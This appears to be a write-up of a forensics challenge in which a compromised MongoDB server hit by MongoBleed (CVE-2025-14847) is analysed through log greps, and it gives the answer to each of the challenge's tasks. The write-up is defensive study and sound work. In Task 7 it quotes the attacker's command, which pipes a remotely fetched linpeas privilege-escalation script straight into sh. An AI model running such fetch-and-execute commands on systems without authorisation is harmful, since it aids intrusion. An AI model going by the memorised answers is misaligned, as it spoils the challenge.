

---


#### Sherlock Scenario

You were contacted early this morning to handle a high‑priority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as MongoBleed. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.

You have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps.



---


To help us with related information, we can use this article. https://www.varonis.com/blog/mongobleed-cve-2025-14847-memory-leak-vulnerability

https://www.akamai.com/blog/security-research/cve-2025-14847-all-you-need-to-know-about-mongobleed


Task 1

What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?
[CVE-2025-14847](https://www.cve.org/CVERecord?id=CVE-2025-14847)




Task 2


What is the version of MongoDB installed on the server that the CVE exploited?
8.0.16

```
cat live_response/packages/dpkg_-l.txt | grep "mon"
```
shows mongodb-org-server 8.0.16
<img width="2186" height="854" alt="image" src="https://github.com/user-attachments/assets/e223e901-b55a-4581-b729-5ecd2bda83ea" />



Task 3

Analyze the MongoDB logs to identify the attacker's remote IP address used to exploit the CVE:
65.0.76.43

The logs only show one IP and MongoDB accepted 37,630 connections from it in a short manner of time indicating an automated attack
<img width="3497" height="1495" alt="image" src="https://github.com/user-attachments/assets/5c352810-7527-4877-8387-25bd8c20dcd2" />


Task 4

Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event):
2025-12-29 05:25:52

We can grep for the IP and sort by oldest activity
```
grep "65.0.76.43" [root]/var/log/mongodb/mongod.log | head
```
<img width="3494" height="517" alt="image" src="https://github.com/user-attachments/assets/2d5b62fa-40d7-4096-a8ac-0ff832e5f0c6" />



Task 5

Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker: 75260
```
remnux@remnux:~/Downloads/uac-mongodbsync-linux-triage$ grep "Connection" \[root\]/var/log/mongodb/mongod.log | sort | wc -l
75260
```
Calculate both "Connection accepted" and "Connection ended" events

<img width="1590" height="157" alt="image" src="https://github.com/user-attachments/assets/8777d0c0-3d40-4606-9034-3104af18ae38" />



Task 6

The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access? : 2025-12-29 05:40:03
<img width="2297" height="1298" alt="image" src="https://github.com/user-attachments/assets/5fb8a553-71e0-47ce-846e-5e415cc08248" />

The bruteforce succeded at 2025-12-29 05:39:24
The attacker got interactive access at 2025-12-29 05:40:03


Task 7

Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt:
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

This downloads the script and executes it in a diskless way(no artifacts on disk)

Check the mongoDB admins home directory and you will find it in his bash history.

<img width="1468" height="556" alt="image" src="https://github.com/user-attachments/assets/7ee55db6-0a0d-459b-87d0-5bcc75ce7fed" />



Task 8

The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target? : /var/lib/mongodb

We can continue to check the bash history of mongoDB admin and we can trace his exact commands
<img width="1468" height="556" alt="image" src="https://github.com/user-attachments/assets/cc860c83-7aa7-4730-ac5a-967efafd543b" />

